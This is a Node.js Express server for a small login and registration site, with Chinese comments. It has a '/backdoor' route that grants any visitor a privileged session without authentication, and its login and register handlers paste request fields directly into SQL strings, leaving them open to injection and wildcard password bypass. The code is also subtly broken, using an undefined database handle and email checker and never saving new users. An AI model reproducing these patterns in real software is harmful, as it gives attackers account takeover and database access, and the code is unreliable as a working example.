const express = require('express');
const bp = require('body-parser'); // Post
const ejs = require('ejs');
const session = require('express-session');
const obj = require('./configs/object.js');
const msl = require('./configs/mysqli.js');
const Data = require('./configs/data.js');
const { json } = require('express');

const app = express();
const Port = 80;
app.set('views', __dirname + '/www');
app.engine('html', ejs.renderFile); // 解析 HTML
app.set('view engine', 'html'); // 解析 HTML
app.use(bp.json()); // 解析 POST
app.use(bp.urlencoded({ extended: true })); // 解析 POST
app.use('/css', express.static(__dirname + '/www/css')); // 靜態取得 (css)
app.use('/js', express.static(__dirname + '/www/js')); // 靜態取得 (js)
app.use(session({ // 設定 session
    secret: 'keyboard cat', // 伺服器認證名字 (隨意)
    name: 'sessionID', // 使用者的 ID
    resave: false, // session 沒有變化是否保存
    saveUninitialized: true, // 未設定 session 名子也儲存
    cookie: {
        // secure: true, // 僅限 https 使用
        // maxAge: 100 * 1000, // 過期時間
    },
}))

app.get('/backdoor', (req, res) => { // 後門
    req.session.user = {
        name: '後門使用者',
        account: '後門使用者',
        password: '後門使用者',
        email: 'backdoor@backdoor.com',
        id: -1,
        rank: 2
    }
    res.redirect('/');
})

app.get('/', (req, res) => {
    const user = req.session.user;
    if (user) {
        res.render('lobby', user);
    } else {
        res.render('index');
    }
});

app.post('/login', (req, res) => { // 登入
    let post = req.body;
    try {
        let sql = `SELECT * FROM nodejs.user as user WHERE (account LIKE '${post.account}' OR email LIKE '${post.account}') AND password LIKE '${post.password}' LIMIT 1`;
        db.query(sql, (err, user) => {
            if (err) throw err;
            if (user.length) {
                delete user[0].password;
                req.session.user = user[0];
                res.status(200).send();
            } else { // 登入失敗
                let sql = `SELECT * FROM nodejs.user as user WHERE account LIKE '${post.account}' OR email LIKE '${post.account}' LIMIT 1`;
                db.query(sql, (err, data) => {
                    if (err) throw err;
                    let ret = {
                        account: '',
                        password: ''
                    }
                    if (!data.length) ret.account = '帳號錯誤';
                    else ret.password = '密碼錯誤';
                    res.status(401).send(JSON.stringify(ret));
                })
            }
        });
    } catch (err) {
        res.status(500).send('伺服器錯誤');
        console.log(err);
    }
});

app.post('/register', (req, res) => { // 註冊
    let post = req.body;
    const needKeys = ['account', 'password', 'email', 'name'];
    if (!obj.haveKeys(post, needKeys)) { // 資料不完整
        res.status(401).send('資料錯誤');
        return;
    } else if (!isEmail(post.email)) { // 電子郵件格式不正確
        res.status(401).send(JSON.stringify({ email: '格式錯誤' }));
        return;
    }
    let account = `SELECT * FROM nodejs.user as user WHERE account LIKE '${post.account}' LIMIT 1`; // 帳號查詢 sql
    msl.exist(account, { account: '帳號重複' }).then(() => {
        let email = `SELECT * FROM nodejs.user as user WHERE email LIKE '${post.email}' LIMIT 1`; // 信箱查詢 sql
        msl.exist(email, { email: '信箱重複' });
    }).then(() => res.status(200).send())
        .catch(err => res.status(401).send(err)); // 查詢回傳錯誤
});

app.use((req, res) => { // 網址錯誤
    res.status(404).render('404');
});

app.listen(Port);